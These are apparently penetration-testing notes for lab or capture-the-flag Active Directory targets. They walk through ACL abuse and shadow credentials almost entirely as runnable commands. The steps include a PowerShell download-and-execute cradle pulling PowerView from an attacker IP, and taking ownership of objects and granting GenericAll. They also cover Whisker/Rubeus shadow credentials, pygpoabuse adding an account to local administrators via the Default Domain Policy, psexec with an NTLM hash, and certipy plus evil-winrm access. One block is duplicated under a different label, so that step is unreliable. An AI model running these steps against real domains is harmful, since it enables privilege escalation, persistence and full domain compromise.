# ACL Abuse and Shadow Credential

## Case 1

## Enumeration&#x20;

### Bloodhound&#x20;

```bash
# DC FQDN should be defined in DNS server or host file.
cme ldap $RHOST -u library -p library --bloodhound -ns $RHOST -c all
```

<figure><img src="../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

Amelia.Griffth (1) is a member of legacy group (2), which has WriteDACL (3) to GPO ADM Account (4). The GPO ADM has GenericAll (5) to Default Domain policy GPO (6).  The Privilege Escalation step should be:&#x20;

* Change WriteDACL to GenericAll to Amelia.Griffiths to abuse the GPO ADM account.&#x20;
* Create a Shadow account for GPO ADM account for your backdoor access (or just change the password of GPO ADM account).&#x20;
* Create a new task in the Default Domain policy GPO with the shadow account credential or new password changed.&#x20;

### Execution&#x20;

{% code overflow="wrap" %}
```bash
# Import Powerview
PS> iex (new-Object Net.WebClient).DownloadString('http://10.8.0.251/privesc/PowerView.ps1')|Import-Module PowerView.ps1

# Search the owner of the GPO and set the onwer to Amelia.Griffiths (Your owned account)
PS> Get-ADUser -Identity "gpoadm" | ForEach-Object { Get-ACL "AD:\$($_.DistinguishedName)" | Select-Object -ExpandProperty Owner }
PS> Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths

# Add GenericAll to Amelia.Griffiths, targetting to GPOADM account.  

PS> Add-DomainObjectAcl -Rights 'All' -TargetIdentity "GPOADM" -PrincipalIdentity "Amelia.Griffiths" -Verbose

# 1) Shadow Account case 

# 1.1) Create a Shadow account 
.\Whisker.exe add /target:gpoadm /domain:baby2.vl /dc:dc.baby2.vl /path:C:\temp\cert.pfx /password:Password0-

# 1.2) Get TGT 
.\Rubeus.exe asktgt /user:gpoadm /certificate:C:\temp\cert.pfx /password:"Password0-" /domain:baby2.vl /dc:dc.baby2.vl /getcredentials /show

# 2) Change the password case 

PS> $UserPassword = ConvertTo-SecureString 'Password0-' -AsPlainText -Force
PS> Set-DomainUserPassword -Identity GPOADM -AccountPassword $UserPassword 

# Abuse GPO
# Check Bloodhound for GPO-id for Default Domain policy GPO. 

# NTLM hash credential
python3 pygpoabuse.py baby2.vl/GPOADM -hashes :51B4E7AEE2FBDD4E36F2381115C8FE7A -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command 'net localgroup administrators GPOADM /add' -dc-ip $RHOST

# Passowrd credential 
python3 pygpoabuse.py baby2.vl/GPOADM:'Password0-' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command 'net localgroup administrators GPOADM /add' -f -dc-ip 10.10.91.214

# Update the GPO 
gpupdate /force

# Check the command result
net user gpoadm

# Connect to the Target
impacket-psexec baby2.vl/gpoadm@$RHOST -hashes :51B4E7AEE2FBDD4E36F2381115C8FE7A
```
{% endcode %}





## Case 2

## Preparation

{% code overflow="wrap" %}
```bash
# Get TGT for a user
impacket-getTGT 'absolute.htb/d.klay:Darkmoonsky248girl' -dc-ip $RHOST

# Inject it into memory 
export KRB5CCNAME=./d.klay.ccache 
```
{% endcode %}

## Enumeration

### LDAP

```bash
crackmapexec ldap dc.absolute.htb --use-kcache --users 
```

<figure><img src="../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

### SMB&#x20;

```
crackmapexec smb dc.absolute.htb --use-kcache --shares
```

<figure><img src="../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

### Bloodhound

{% code overflow="wrap" %}
```bash
bloodhound.py -k -u m.lovegod -p AbsoluteLDAP2022! --auth-method kerberos -d absolute.htb -dc dc.absolute.htb -ns 10.129.228.64 --dns-tcp --zip -c All
```
{% endcode %}

## Exploitation - ACL Abuse and Shadow Credential

Get a Bloodhound result below. The m.lovegod owns the Network Audit group, which has `GenericWrite` on the winrm\_user user. &#x20;

To get access to the machine, I’ll first I’ll need to give m.lovegod write access on the Network Audit group. Then I can add m.lovegod to the group. Finally, I can use those permissions to create a shadow credential for the winrm\_user account to access to the machine via evil\_winrm.&#x20;

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Update the ownership of the user to add a 'write permission'.&#x20;

{% code overflow="wrap" %}
```bash
# Domain: absolute.htb
# User: m.lovegod
# Group: Network Audit

python3 /opt/python/impacket/impacket/examples/owneredit.py -k -no-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -new-owner m.lovegod -target 'Network Audit' -action write
```
{% endcode %}

Add the full control of Group to the user.&#x20;

{% code overflow="wrap" %}
```bash
# Domain: absolute.htb
# User: m.lovegod
# Group: Network Audit

python3 /opt/python/impacket/impacket/examples/owneredit.py -k -no-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -new-owner m.lovegod -target 'Network Audit' -action write
```
{% endcode %}

Add the user to the group.&#x20;

{% code overflow="wrap" %}
```bash
# Domain: absolute.htb
# User: m.lovegod
# Group: Network Audit
Kali> kinit m.lovegod
Kali> net rpc group addmem "Network Audit" -U 'm.lovegod' -k -S dc.absolute.htb m.lovegod

# or 
Kali> net rpc group members "Network Audit" -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
```
{% endcode %}

Create a Shadow Credential.&#x20;

{% code overflow="wrap" %}
```bash
# Let's find ADCS environment. You will see some ADCS configurations. 
KRB5CCNAME=./d.klay.ccache  certipy find -username m.lovegod@absolute.htb -k -target dc.absolute.htb 

# Let's add the shadow credential to the winrm_user user 
KRB5CCNAME=./d.klay.ccache certipy shadow auto -username m.lovegod@absolute.htb -account winrm_user -k -target dc.absolute.htb 

# Let's connect to the machine
KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

